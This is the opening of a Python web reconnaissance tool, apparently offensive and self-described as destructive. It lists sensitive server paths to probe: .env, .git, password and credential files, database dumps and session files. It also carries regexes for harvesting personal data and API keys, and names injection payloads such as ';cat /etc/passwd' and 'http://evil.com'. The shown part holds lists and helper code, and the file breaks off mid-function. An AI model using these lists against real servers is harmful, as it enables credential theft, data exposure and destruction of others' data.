#!/usr/bin/env python3
"""
FINALRECON-AI - WEB SERVER ONLY EDITION 2031
==============================================
Version: 2031.0 - Complete Ultimate Edition
⚠️  WARNING: WEB SERVER ONLY - DESTRUCTIVE OPERATIONS!
⚠️  Use ONLY on YOUR OWN web server or AUTHORIZED targets!
"""

import os
import sys
import re
import json
import time
import gzip
import shutil
import socket
import ssl
import ipaddress
import argparse
import datetime
import subprocess
import tempfile
import requests
import urllib3
from urllib import parse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VERSION = "2031.0"
BUILD_NUMBER = "2031.000.1"

# ============================================
# ROCKYOU PATHS
# ============================================
ROCKYOU_PATHS = [
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/wordlists/rockyou.txt.gz',
    '/opt/wordlists/rockyou.txt',
    '/usr/share/seclists/Passwords/rockyou.txt',
    '~/rockyou.txt',
    './rockyou.txt',
    'rockyou.txt',
]

# ============================================
# PERSONAL INFORMATION PATTERNS
# ============================================
PERSONAL_INFO_PATTERNS = {
    'Full Name': [
        r'\b[A-Z][a-z]+\s+[A-Z][a-z]+\b',
        r'(?:name|fullname|full_name|firstname|lastname)["\']?\s*[:=]\s*["\']([A-Za-z\s]{3,50})["\']',
    ],
    'Email Address': [
        r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        r'(?:email|mail|e-mail)["\']?\s*[:=]\s*["\']([^"\']+@[^"\']+)["\']',
    ],
    'Phone Number': [
        r'(?:\+\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',
        r'(?:phone|mobile|tel|telephone)["\']?\s*[:=]\s*["\']([+\d\s\-()]{7,20})["\']',
    ],
    'Address': [
        r'(?:address|addr|location)["\']?\s*[:=]\s*["\']([^"\']{10,200})["\']',
    ],
    'Date of Birth': [
        r'(?:dob|birth|birthday|date_of_birth)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    ],
    'SSN / National ID': [
        r'\b\d{3}-\d{2}-\d{4}\b',
        r'(?:ssn|social_security|national_id|nid)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    ],
    'Passport Number': [
        r'(?:passport|passport_no|passport_number)["\']?\s*[:=]\s*["\']([A-Z0-9]{6,12})["\']',
    ],
    'Driver License': [
        r'(?:license|licence|driver_license|dl_number)["\']?\s*[:=]\s*["\']([A-Z0-9\-]{5,20})["\']',
    ],
    'Credit Card': [
        r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
    ],
    'Bank Account': [
        r'(?:account|acct|account_number|bank_account)["\']?\s*[:=]\s*["\']([0-9\-]{6,20})["\']',
        r'(?:iban|IBAN)["\']?\s*[:=]\s*["\']([A-Z]{2}[0-9]{2}[A-Z0-9]{10,30})["\']',
    ],
    'Username': [
        r'(?:username|user_name|user|login)["\']?\s*[:=]\s*["\']([a-zA-Z0-9_.\-]{3,30})["\']',
    ],
    'Password Field': [
        r'(?:password|passwd|pwd|pass)["\']?\s*[:=]\s*["\']([^"\']{4,50})["\']',
    ],
    'Social Media': [
        r'(?:facebook|twitter|instagram|linkedin|tiktok|youtube)\.com/[a-zA-Z0-9_.\-]+',
        r'@[a-zA-Z0-9_]{3,30}',
    ],
    'IP Address': [
        r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
    ],
    'MAC Address': [
        r'\b(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}\b',
    ],
    'GPS Coordinates': [
        r'\b[-+]?\d{1,3}\.\d{4,},\s*[-+]?\d{1,3}\.\d{4,}\b',
    ],
    'API Token/Secret': [
        r'(?:secret|token|api_secret|private_key)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{16,})["\']',
    ],
    'Crypto Wallet': [
        r'\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b',
        r'\b0x[a-fA-F0-9]{40}\b',
    ],
}

# ============================================
# GATEWAY DETECTION PATTERNS
# ============================================
GATEWAY_INDICATORS = {
    'Default Gateway Headers': [
        'x-forwarded-for', 'x-forwarded-host', 'x-forwarded-proto',
        'x-real-ip', 'x-original-url', 'x-rewrite-url',
        'via', 'forwarded', 'x-gateway', 'x-proxy',
    ],
    'Gateway Server Headers': [
        'server', 'x-powered-by', 'x-aspnet-version',
        'x-generator', 'x-drupal-cache', 'x-varnish',
        'x-cache', 'x-cache-hit', 'cf-cache-status',
    ],
    'Load Balancer Headers': [
        'x-load-balancer', 'x-lb', 'x-alb', 'x-elb',
        'x-nlb', 'x-haproxy', 'x-traefik',
    ],
    'CDN Headers': [
        'cf-ray', 'cf-cache-status', 'x-cdn',
        'x-amz-cf-id', 'x-akamai', 'x-fastly',
        'x-sucuri', 'x-cloudflare',
    ],
    'Suspicious Gateway Paths': [
        '/gateway', '/proxy', '/forward', '/redirect',
        '/api/gateway', '/api/proxy', '/admin/gateway',
        '/cgi-bin/', '/.well-known/', '/actuator/',
        '/actuator/gateway', '/actuator/health',
        '/management/', '/env', '/trace', '/dump',
    ],
}

SUSPICIOUS_GATEWAY_SYSTEMS = {
    'Spring Boot Actuator': [
        '/actuator', '/actuator/health', '/actuator/env',
        '/actuator/beans', '/actuator/mappings', '/actuator/trace',
    ],
    'Spring Cloud Gateway': [
        '/actuator/gateway/routes', '/actuator/gateway/globalfilters',
    ],
    'Kong Gateway': [
        '/kong', '/status', '/metrics', '/services', '/routes',
    ],
    'Traefik Dashboard': [
        '/dashboard', '/api/rawdata', '/api/overview',
    ],
    'Nginx Status': [
        '/nginx_status', '/status', '/stub_status',
    ],
    'Apache Status': [
        '/server-status', '/server-info',
    ],
    'Consul': [
        '/v1/agent/self', '/v1/catalog/services', '/ui/',
    ],
    'Eureka': [
        '/eureka', '/eureka/apps', '/eureka/status',
    ],
    'Envoy Admin': [
        '/stats', '/config_dump', '/clusters', '/listeners',
    ],
    'HAProxy Stats': [
        '/haproxy?stats', '/stats', '/;csv',
    ],
    'Docker API': [
        '/version', '/info', '/containers/json', '/images/json',
    ],
    'Kubernetes API': [
        '/api/v1/namespaces', '/api/v1/pods', '/healthz',
    ],
    'Prometheus': [
        '/metrics', '/prometheus', '/graph',
    ],
    'Grafana': [
        '/grafana', '/api/health', '/login',
    ],
    'Kibana': [
        '/kibana', '/app/kibana', '/api/status',
    ],
    'Elasticsearch': [
        '/_cluster/health', '/_cat/indices', '/_nodes',
    ],
}

# ============================================
# GWS (Google Web Server) DATA TARGETS
# ============================================
GWS_DATA_TARGETS = {
    'GWS Log Files': [
        '/var/log/google/access.log', '/var/log/google/error.log',
        '/var/log/gws/access.log', '/var/log/gws/error.log',
        '/logs/google/access.log', '/logs/gws/access.log',
        '/google/logs/', '/gws/logs/', '/google_access.log',
        '/gws_access.log', '/google_error.log', '/gws_error.log',
    ],
    'GWS Config Files': [
        '/etc/google/gws.conf', '/etc/gws/gws.conf',
        '/etc/google/config.json', '/etc/gws/config.json',
        '/google/config/', '/gws/config/', '/gws/settings/',
        '/google/settings/', '/.google/', '/.gws/',
    ],
    'GWS Cache Files': [
        '/var/cache/google/', '/var/cache/gws/',
        '/google/cache/', '/gws/cache/', '/cache/google/',
        '/cache/gws/', '/.google/cache/', '/.gws/cache/',
    ],
    'GWS Data Files': [
        '/google/data/', '/gws/data/', '/data/google/',
        '/data/gws/', '/google/db/', '/gws/db/',
        '/google/database/', '/gws/database/',
        '/google/data.db', '/gws/data.db', '/google.db', '/gws.db',
    ],
    'GWS Backup Files': [
        '/google/backup/', '/gws/backup/', '/backup/google/',
        '/backup/gws/', '/google_backup.zip', '/gws_backup.zip',
        '/google_backup.tar.gz', '/gws_backup.tar.gz',
        '/google.sql', '/gws.sql', '/google_dump.sql', '/gws_dump.sql',
    ],
    'GWS Old Data': [
        '/google/old/', '/gws/old/', '/old/google/', '/old/gws/',
        '/google/archive/', '/gws/archive/', '/google/legacy/',
        '/gws/legacy/', '/google_old/', '/gws_old/',
    ],
    'GWS Session Files': [
        '/var/lib/google/sessions/', '/var/lib/gws/sessions/',
        '/google/sessions/', '/gws/sessions/',
        '/tmp/google/', '/tmp/gws/', '/sessions/google/', '/sessions/gws/',
    ],
    'GWS Upload Directories': [
        '/google/uploads/', '/gws/uploads/', '/uploads/google/',
        '/uploads/gws/', '/google/files/', '/gws/files/',
        '/google/media/', '/gws/media/', '/google/images/', '/gws/images/',
    ],
    'GWS Text Files': [
        '/google/readme.txt', '/gws/readme.txt', '/google/notes.txt',
        '/gws/notes.txt', '/google/passwords.txt', '/gws/passwords.txt',
        '/google/users.txt', '/gws/users.txt', '/google/config.txt',
        '/gws/config.txt', '/google/data.txt', '/gws/data.txt',
    ],
    'GWS Cookies': [
        '/google/cookies.txt', '/gws/cookies.txt',
        '/google/cookies.json', '/gws/cookies.json',
        '/google/session.json', '/gws/session.json',
    ],
    'GWS Site Data': [
        '/google/site_data/', '/gws/site_data/',
        '/google/sitedata/', '/gws/sitedata/',
        '/google/storage/', '/gws/storage/',
        '/google/localstorage/', '/gws/localstorage/',
    ],
}

# ============================================
# ESF (Elasticsearch File) DATA TARGETS
# ============================================
ESF_DATA_TARGETS = {
    'ESF Log Files': [
        '/var/log/elasticsearch/', '/var/log/es/', '/var/log/elastic/',
        '/logs/elasticsearch/', '/logs/es/', '/logs/elastic/',
        '/elasticsearch/logs/', '/es/logs/', '/elastic/logs/',
        '/elasticsearch.log', '/es.log', '/elastic.log',
        '/elasticsearch_access.log', '/es_access.log',
    ],
    'ESF Config Files': [
        '/etc/elasticsearch/', '/etc/es/', '/etc/elastic/',
        '/elasticsearch/config/', '/es/config/', '/elastic/config/',
        '/elasticsearch.yml', '/es.yml', '/elastic.yml',
        '/elasticsearch.json', '/es.json', '/elastic.json',
        '/elasticsearch.conf', '/es.conf', '/elastic.conf',
    ],
    'ESF Data Files': [
        '/var/lib/elasticsearch/', '/var/lib/es/', '/var/lib/elastic/',
        '/elasticsearch/data/', '/es/data/', '/elastic/data/',
        '/elasticsearch/db/', '/es/db/', '/elastic/db/',
        '/elasticsearch/data.db', '/es/data.db',
    ],
    'ESF Indices': [
        '/_cat/indices', '/_cluster/health', '/_nodes',
        '/_cat/nodes', '/_cat/shards', '/_cat/allocation',
        '/_cluster/stats', '/_nodes/stats', '/_stats',
        '/_search', '/_all', '/_mapping', '/_settings',
    ],
    'ESF Backup Files': [
        '/elasticsearch/backup/', '/es/backup/', '/elastic/backup/',
        '/backup/elasticsearch/', '/backup/es/', '/backup/elastic/',
        '/elasticsearch_backup.zip', '/es_backup.zip',
        '/elasticsearch_backup.tar.gz', '/es_backup.tar.gz',
        '/elasticsearch.sql', '/es.sql', '/elasticsearch_dump.sql',
    ],
    'ESF Old Data': [
        '/elasticsearch/old/', '/es/old/', '/elastic/old/',
        '/old/elasticsearch/', '/old/es/', '/old/elastic/',
        '/elasticsearch/archive/', '/es/archive/', '/elastic/archive/',
        '/elasticsearch/legacy/', '/es/legacy/', '/elastic/legacy/',
    ],
    'ESF Cache Files': [
        '/var/cache/elasticsearch/', '/var/cache/es/', '/var/cache/elastic/',
        '/elasticsearch/cache/', '/es/cache/', '/elastic/cache/',
        '/cache/elasticsearch/', '/cache/es/', '/cache/elastic/',
    ],
    'ESF Session Files': [
        '/var/lib/elasticsearch/sessions/', '/var/lib/es/sessions/',
        '/elasticsearch/sessions/', '/es/sessions/',
        '/tmp/elasticsearch/', '/tmp/es/', '/tmp/elastic/',
    ],
    'ESF Upload Directories': [
        '/elasticsearch/uploads/', '/es/uploads/', '/elastic/uploads/',
        '/uploads/elasticsearch/', '/uploads/es/', '/uploads/elastic/',
        '/elasticsearch/files/', '/es/files/', '/elastic/files/',
    ],
    'ESF Text Files': [
        '/elasticsearch/readme.txt', '/es/readme.txt', '/elastic/readme.txt',
        '/elasticsearch/notes.txt', '/es/notes.txt', '/elastic/notes.txt',
        '/elasticsearch/passwords.txt', '/es/passwords.txt',
        '/elasticsearch/config.txt', '/es/config.txt',
        '/elasticsearch/data.txt', '/es/data.txt',
    ],
    'ESF Cookies': [
        '/elasticsearch/cookies.txt', '/es/cookies.txt',
        '/elasticsearch/cookies.json', '/es/cookies.json',
        '/elasticsearch/session.json', '/es/session.json',
    ],
    'ESF Site Data': [
        '/elasticsearch/site_data/', '/es/site_data/',
        '/elasticsearch/sitedata/', '/es/sitedata/',
        '/elasticsearch/storage/', '/es/storage/',
    ],
}

# ============================================
# WEB SERVER DATA CLEANER TARGETS
# ============================================
WEB_SERVER_DATA_TARGETS = {
    'Backup Files': [
        '/backup.zip', '/backup.tar.gz', '/backup.tar', '/backup.rar',
        '/backup.sql', '/backup.sql.gz', '/backup.tar.bz2',
        '/site.zip', '/site.tar.gz', '/www.zip', '/html.zip',
        '/website.zip', '/website.tar.gz', '/web.zip',
        '/db.sql', '/database.sql', '/dump.sql', '/db_backup.sql',
        '/backup/', '/backups/', '/bak/', '/backup_old/',
        '/wordpress.zip', '/wp.zip', '/wp-content.zip',
        '/wp-config.php.bak', '/config.php.bak', '/index.php.bak',
        '/index.html.bak', '/database.sql', '/db.sql',
    ],
    'Old Files': [
        '/old/', '/old_files/', '/old_version/', '/old_site/',
        '/previous/', '/archive/', '/archives/', '/historical/',
        '/.old/', '/legacy/', '/deprecated/',
        '/v1/', '/v1.0/', '/v2/', '/v2.0/', '/v3/',
        '/2019/', '/2020/', '/2021/', '/2022/', '/2023/',
        '/2024/', '/2025/', '/2026/', '/2027/', '/2028/',
        '/old_index.html', '/old_index.php', '/index_old.html',
        '/index.bak', '/index.old', '/index.save',
    ],
    'Log Files': [
        '/access.log', '/error.log', '/debug.log', '/app.log',
        '/application.log', '/server.log', '/nginx.log',
        '/apache.log', '/apache2.log', '/httpd.log',
        '/logs/access.log', '/logs/error.log', '/logs/debug.log',
        '/log/access.log', '/log/error.log',
        '/access.log.1', '/error.log.1', '/access.log.gz',
        '/logs/', '/log/',
    ],
    'Config Files': [
        '/.env', '/.env.local', '/.env.production', '/.env.development',
        '/.env.backup', '/.env.old', '/.env.save', '/.env.bak',
        '/config.php', '/config.json', '/config.xml', '/config.yml',
        '/config.yaml', '/config.ini', '/config.conf',
        '/wp-config.php', '/configuration.php',
        '/settings.py', '/settings.json', '/settings.xml',
        '/.htaccess', '/web.config', '/nginx.conf', '/php.ini',
        '/.git/config', '/.git/HEAD', '/.gitignore',
        '/Dockerfile', '/docker-compose.yml',
        '/package.json', '/composer.json', '/requirements.txt',
    ],
    'Cache Files': [
        '/cache/', '/.cache/', '/tmp/', '/temp/',
        '/cache/data.json', '/cache/data.xml', '/cache/data.db',
        '/tmp/cache/', '/temp/cache/',
        '/storage/cache/', '/storage/framework/cache/',
        '/var/cache/', '/cache.sqlite', '/cache.db',
    ],
    'Session Files': [
        '/sessions/', '/session/', '/tmp/sessions/',
        '/storage/sessions/', '/storage/framework/sessions/',
        '/var/lib/php/sessions/',
    ],
    'Upload Directories': [
        '/uploads/', '/upload/', '/files/', '/media/',
        '/images/', '/img/', '/documents/', '/docs/',
        '/uploads/files/', '/uploads/images/',
        '/attachments/', '/user_uploads/', '/user_files/',
        '/public/uploads/', '/storage/uploads/',
        '/wp-content/uploads/',
    ],
    'Database Files': [
        '/data.db', '/database.db', '/sqlite.db', '/sqlite3.db',
        '/db.sqlite', '/db.sqlite3', '/app.db', '/storage.db',
        '/main.db', '/website.db', '/site.db',
        '/mysql.sql', '/mysqldump.sql', '/db_dump.sql',
    ],
    'Source Code': [
        '/.git/', '/.svn/', '/.hg/',
        '/.git/config', '/.git/HEAD', '/.git/index',
        '/src/', '/source/', '/code/',
        '/app/', '/application/', '/includes/',
        '/lib/', '/vendor/', '/node_modules/',
        '/public/', '/private/', '/protected/',
        '/system/', '/core/', '/modules/', '/plugins/',
        '/themes/', '/templates/', '/views/',
        '/assets/', '/static/', '/css/', '/js/',
    ],
    'Temporary Files': [
        '/tmp/', '/temp/', '/.tmp/', '/.temp/',
        '/tmp/upload/', '/tmp/cache/', '/tmp/files/',
        '/temp/upload/', '/temp/cache/',
    ],
    'Old Versions': [
        '/old/', '/backup/', '/bak/', '/archive/',
        '/archives/', '/historical/', '/legacy/',
        '/v1/', '/v2/', '/v3/', '/old_version/',
        '/previous/', '/previous_version/',
    ],
    'Text Files': [
        '/readme.txt', '/README.txt', '/README.md',
        '/license.txt', '/LICENSE.txt', '/license.md',
        '/changelog.txt', '/CHANGELOG.txt',
        '/notes.txt', '/NOTES.txt', '/notes.md',
        '/todo.txt', '/TODO.txt',
        '/info.txt', '/INFO.txt', '/info.md',
        '/test.txt', '/TEST.txt',
        '/passwords.txt', '/PASSWORDS.txt', '/passwd.txt',
        '/users.txt', '/USERS.txt', '/user.txt',
        '/admin.txt', '/ADMIN.txt', '/login.txt',
        '/config.txt', '/CONFIG.txt', '/settings.txt',
        '/data.txt', '/DATA.txt', '/output.txt',
        '/log.txt', '/LOG.txt', '/error.txt',
        '/backup.txt', '/BACKUP.txt', '/old.txt',
        '/secret.txt', '/SECRET.txt', '/private.txt',
        '/keys.txt', '/KEYS.txt', '/tokens.txt',
        '/api_keys.txt', '/API_KEYS.txt', '/credentials.txt',
        '/connection.txt', '/database.txt', '/db.txt',
        '/install.txt', '/INSTALL.txt', '/setup.txt',
        '/requirements.txt', '/REQUIREMENTS.txt',
    ],
    'HTML/PHP Files': [
        '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
        '/admin.php', '/login.php', '/config.php', '/setup.php',
        '/install.php', '/installer.php', '/upgrade.php',
        '/update.php', '/maintenance.php', '/status.php',
        '/health.php', '/healthcheck.php', '/ping.php',
        '/index.php.bak', '/index.php.old', '/index.php.save',
        '/index.html.bak', '/index.html.old',
        '/admin.html', '/login.html', '/config.html',
        '/test.html', '/debug.html', '/phpinfo.html',
        '/default.html', '/default.php', '/home.html',
    ],
    'Archive Files': [
        '/backup.7z', '/backup.rar', '/backup.zip', '/backup.tar',
        '/backup.tar.gz', '/backup.tar.bz2', '/backup.tgz',
        '/site.7z', '/site.rar', '/site.zip', '/site.tar',
        '/site.tar.gz', '/www.7z', '/www.rar', '/www.zip',
        '/web.7z', '/web.rar', '/web.zip', '/web.tar',
        '/html.7z', '/html.rar', '/html.zip',
        '/archive.zip', '/archive.tar.gz', '/archive.rar',
        '/files.zip', '/files.tar.gz', '/files.rar',
        '/data.zip', '/data.tar.gz', '/data.rar',
        '/db.zip', '/db.tar.gz', '/db.rar',
        '/database.zip', '/database.tar.gz',
    ],
    'Environment Files': [
        '/.env', '/.env.local', '/.env.production',
        '/.env.development', '/.env.staging', '/.env.test',
        '/.env.backup', '/.env.old', '/.env.save', '/.env.bak',
        '/.env.example', '/.env.sample', '/.env.dist',
        '/env', '/environment', '/environments',
        '/config/.env', '/config/env',
        '/app/.env', '/app/env',
    ],
    'Git Files': [
        '/.git/config', '/.git/HEAD', '/.git/index',
        '/.git/description', '/.git/packed-refs',
        '/.git/refs/heads/master', '/.git/refs/heads/main',
        '/.gitignore', '/.gitattributes', '/.gitmodules',
    ],
    'SVN Files': [
        '/.svn/entries', '/.svn/format', '/.svn/wc.db',
        '/.svn/all-wcprops', '/.svn/dir-prop-base',
        '/.svn/prop-base/', '/.svn/text-base/',
    ],
    'IDE Files': [
        '/.idea/', '/.idea/workspace.xml', '/.idea/misc.xml',
        '/.vscode/', '/.vscode/settings.json',
        '/.project', '/.classpath', '/.settings/',
        '/nbproject/', '/.netbeans/', '/.DS_Store',
    ],
    'Cookies & Site Data': [
        '/cookies.txt', '/cookies.json', '/cookies.xml',
        '/session.txt', '/session.json', '/sessions.json',
        '/site_data/', '/sitedata/', '/site_data.json',
        '/localstorage/', '/local_storage/', '/localstorage.json',
        '/sessionstorage/', '/session_storage/',
        '/indexeddb/', '/indexed_db/', '/idb/',
        '/web_data/', '/webdata/', '/browser_data/',
        '/user_data/', '/userdata/', '/profile_data/',
        '/storage/', '/storage.json', '/storage.xml',
        '/app_data/', '/appdata/', '/application_data/',
    ],
}

# ============================================
# ALL SERVER TARGETS (GWS + ESF + Another)
# ============================================
ALL_SERVER_TARGETS = {
    **GWS_DATA_TARGETS,
    **ESF_DATA_TARGETS,
}

# ============================================
# PHISHING PATTERNS
# ============================================
PHISHING_PATTERNS = {
    'Fake Login Form': [
        r'<form[^>]*action=["\'][^"\']*login[^"\']*["\']',
        r'<input[^>]*type=["\']password["\']',
    ],
    'Credential Harvesting': [
        r'<input[^>]*name=["\']username["\']',
        r'<input[^>]*name=["\']email["\']',
    ],
    'Suspicious Domains': [
        r'bit\.ly', r'tinyurl\.com', r'goo\.gl',
    ],
    'Suspicious Keywords': [
        r'verify your account', r'confirm your identity',
        r'urgent action required', r'account suspended',
    ],
    'Fake Payment': [
        r'credit card', r'card number', r'cvv',
    ],
    'Obfuscated JavaScript': [
        r'eval\(function\(p,a,c,k,e,d\)',
        r'unescape\(', r'String\.fromCharCode\(',
    ],
}

# ============================================
# VULNERABILITY PATTERNS
# ============================================
VULN_PATTERNS = {
    'SQL Injection': [
        r"' OR '1'='1", r"' OR 1=1", r"UNION SELECT",
    ],
    'XSS': [
        r'<script>alert', r'javascript:', r'onerror=',
    ],
    'LFI': [
        r'\.\./\.\./\.\./', r'etc/passwd',
    ],
    'RFI': [
        r'http://evil\.com', r'https://attacker\.com',
    ],
    'Command Injection': [
        r';cat /etc/passwd', r'\|whoami', r'`id`',
    ],
    'SSRF': [
        r'http://127\.0\.0\.1', r'http://localhost',
    ],
    'Open Redirect': [
        r'url=http://', r'redirect=http://',
    ],
}


class Fore:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'


CONFIG = {
    'timeout': 10,
    'export_dir': 'finalrecon-ai-results',
}

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8000, 8888, 9000,
                9090, 10000, 27017, 6379, 9200, 5601, 3000, 5000, 9001]

COMMON_SUBDOMAINS = [
    'www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'ns1', 'ns2', 'cpanel',
    'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns', 'blog',
    'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2',
    'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
    'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
    'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal',
    'video', 'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'ns4', 'www3',
    'dns', 'search', 'staging', 'server', 'mx1', 'chat', 'wap', 'my', 'svn',
    'mail1', 'sites', 'proxy', 'ads', 'host', 'crm', 'cms', 'backup', 'mx2',
    'info', 'apps', 'download', 'remote', 'db', 'forums', 'store', 'relay',
    'files', 'app', 'live', 'owa', 'en', 'start', 'sms', 'office', 'exchange',
    'gateway', 'router', 'firewall', 'monitor', 'jenkins', 'gitlab', 'jira',
    'docker', 'k8s', 'aws', 'azure', 'gcp', 'cloud', 's3', 'storage', 'assets'
]

DEFAULT_WORDLIST = [
    'admin', 'login', 'wp-admin', 'administrator', 'backup', 'backups',
    'config', 'configs', 'db', 'database', 'sql', 'test', 'tests',
    'dev', 'development', 'staging', 'prod', 'production', 'api',
    'apis', 'v1', 'v2', 'docs', 'documentation', 'help', 'support',
    'uploads', 'upload', 'files', 'file', 'images', 'img', 'css',
    'js', 'javascript', 'assets', 'static', 'media', 'video', 'videos',
    'download', 'downloads', 'private', 'secret', 'secrets', 'hidden',
    'tmp', 'temp', 'cache', 'logs', 'log', 'error', 'errors', 'debug',
    'phpinfo.php', 'info.php', 'test.php', 'robots.txt', 'sitemap.xml',
    '.git', '.svn', '.env', '.htaccess', 'web.config', 'crossdomain.xml',
    'phpmyadmin', 'pma', 'mysql', 'adminer', 'cpanel', 'whm', 'webmail',
    'mail', 'email', 'smtp', 'pop3', 'imap', 'ftp', 'ssh', 'telnet',
    'vpn', 'proxy', 'gateway', 'router', 'switch', 'firewall', 'waf',
    'cdn', 'dns', 'ns1', 'ns2', 'mx', 'mail1', 'mail2', 'portal',
    'intranet', 'cms', 'crm', 'erp', 'hr', 'finance', 'forum', 'blog',
    'news', 'media', 'gallery', 'shop', 'store', 'cart', 'checkout',
    'user', 'users', 'profile', 'account', 'register', 'signup', 'login',
    'password', 'reset', 'forgot', 'status', 'health', 'monitor', 'stats',
    'security', 'secure', 'ssl', 'tls', 'cert', 'certificate', 'key',
    'token', 'session', 'cookie', 'header', 'debug', 'trace', 'info'
]

API_KEY_PATTERNS = {
    'AWS Access Key': r'AKIA[0-9A-Z]{16}',
    'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
    'GitHub Token': r'gh[pousr]_[0-9a-zA-Z]{36}',
    'GitLab Token': r'glpat-[0-9a-zA-Z\-_]{20}',
    'Slack Token': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
    'Discord Token': r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
    'Telegram Bot Token': r'[0-9]{8,10}:[a-zA-Z0-9_-]{35}',
    'Stripe Live Key': r'sk_live_[0-9a-zA-Z]{24}',
    'Stripe Test Key': r'sk_test_[0-9a-zA-Z]{24}',
    'MongoDB URI': r'mongodb(\+srv)?://[^\s"\']+',
    'PostgreSQL URI': r'postgres(ql)?://[^\s"\']+',
    'MySQL URI': r'mysql://[^\s"\']+',
    'Redis URI': r'redis://[^\s"\']+',
    'RSA Private Key': r'-----BEGIN RSA PRIVATE KEY-----',
    'JWT Token': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
    'Generic API Key': r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{20,})["\']',
}

BROKEN_SERVER_INDICATORS = [
    'this site can\'t be reached',
    'this page isn\'t working',
    'http error 500', 'http error 502',
    'http error 503', 'http error 504',
    'internal server error', 'bad gateway',
    'service unavailable', 'gateway timeout',
    'connection refused', 'connection timed out',
]


# ============================================
# SAFE FILE OPERATIONS
# ============================================
def safe_makedirs(path):
    try:
        if path and not os.path.exists(path):
            os.makedirs(path, exist_ok=True)
        return True
    except Exception:
        return False


def safe_write_file(path, content):
    try:
        dir_name = os.path.dirname(path)
        if dir_name:
            safe_makedirs(dir_name)
        with open(path, 'w') as f:
            f.write(content)
        return True
    except Exception:
        return False


def safe_read_file(path):
    try:
        if not os.path.exists(path):
            return None
        with open(path, 'r', errors='ignore') as f:
            return f.read()
    except Exception:
        return None


def read_wordlist_streaming(path, max_lines=10000):
    words = []
    try:
        with open(path, 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                if i >= max_lines:
                    break
                line = line.strip()
                if line and not line.startswith('#'):
                    words.append(line)
    except Exception:
        pass
    return words


# ============================================
# SSH CHECKER
# ============================================
def check_ssh_installed():
    print(Fore.CYAN + "\n" + "=" * 60)
    print(Fore.CYAN + "[*] SSH INSTALLATION CHECK")
    print(Fore.CYAN + "=" * 60)

    ssh_paths = ['/usr/bin/ssh', '/usr/local/bin/ssh', '/bin/ssh']
    ssh_found = False

    for path in ssh_paths:
        if os.path.exists(path):
            print(Fore.GREEN + f"[+] SSH found: {path}")
            ssh_found = True
            break

    if not ssh_found:
        print(Fore.RED + "[!] SSH NOT INSTALLED")
        print(Fore.YELLOW + "\n[*] Install with:")
        print(Fore.WHITE + "    sudo apt update")
        print(Fore.WHITE + "    sudo apt install openssh-client")
        print(Fore.CYAN + "=" * 60 + "\n")
        return False

    try:
        result = subprocess.run(['ssh', '-V'], capture_output=True, text=True, timeout=5)
        print(Fore.GREEN + f"[+] SSH version: {result.stderr.strip()}")
    except Exception:
        pass

    print(Fore.CYAN + "=" * 60 + "\n")
    return True


# ============================================
# ROCKYOU FINDER
# ============================================
def find_rockyou():
    print(Fore.CYAN + "\n" + "=" * 60)
    print(Fore.CYAN + "[*] ROCKYOU WORDLIST FINDER")
    print(Fore.CYAN + "=" * 60)

    for path in ROCKYOU_PATHS:
        expanded = os.path.expanduser(path)

        if os.path.exists(expanded):
            if expanded.endswith('.gz'):
                print(Fore.YELLOW + f"[!] Found compressed: {expanded}")
                try:
                    tmp_path = os.path.join(tempfile.gettempdir(), 'rockyou_decompressed.txt')
                    with gzip.open(expanded, 'rb') as f_in:
                        with open(tmp_path, 'wb') as f_out:
                            shutil.copyfileobj(f_in, f_out)
                    print(Fore.GREEN + f"[+] Decompressed to: {tmp_path}")
                    return tmp_path
                except Exception as e:
                    print(Fore.RED + f"[-] Decompress error: {e}")
                    continue

            if os.access(expanded, os.R_OK):
                size = os.path.getsize(expanded)
                size_mb = round(size / (1024 * 1024), 2)
                print(Fore.GREEN + f"[+] Found: {expanded} ({size_mb} MB)")
                return expanded

    print(Fore.RED + "\n[!] rockyou.txt NOT FOUND")
    print(Fore.CYAN + "=" * 60 + "\n")
    return None


def validate_wordlist_path(path):
    if not path:
        return None
    if path.lower() in ['rockyou', 'rockyou.txt']:
        return find_rockyou()
    if os.path.exists(path):
        if os.path.isfile(path) and os.access(path, os.R_OK):
            return path
    dir_name = os.path.dirname(path)
    if dir_name and not os.path.exists(dir_name):
        safe_makedirs(dir_name)
    if safe_write_file(path, '\n'.join(DEFAULT_WORDLIST)):
        return path
    try:
        tmp_path = os.path.join(tempfile.gettempdir(), 'finalrecon_wordlist.txt')
        if safe_write_file(tmp_path, '\n'.join(DEFAULT_WORDLIST)):
            return tmp_path
    except Exception:
        pass
